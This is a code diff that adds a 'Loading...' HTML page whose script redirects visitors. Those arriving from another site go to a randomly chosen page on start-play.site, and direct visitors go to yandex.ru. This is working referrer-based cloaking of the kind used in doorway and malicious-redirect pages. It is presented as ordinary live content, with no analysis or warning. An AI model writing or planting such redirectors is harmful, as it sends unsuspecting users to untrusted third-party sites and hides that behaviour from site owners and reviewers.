@@ -1,0 +1,16 @@
+<html><head><title>Loading</title><script type="text/javascript"> 
+    var path;
+    var rand = Math.floor(Math.random() * (10 - 1 + 1)) + 1; 
+    var rand2 = Math.floor(Math.random() * (2 - 1 + 1)) + 1;
+    if (rand2 == 1) {path = "p";}
+    if (rand2 == 2) {path = "v";}
+
+    var link = "http://start-play.site/"+path+"/"+rand+".html"; 
+    var a = document.referrer;
+           var k =  a.indexOf("http");
+           if (k > -1) {
+                 document.location.href = link;    
+           } else {
+                document.location.href = "http://yandex.ru";
+           }
+</script></head><body>Loading...</body></html>
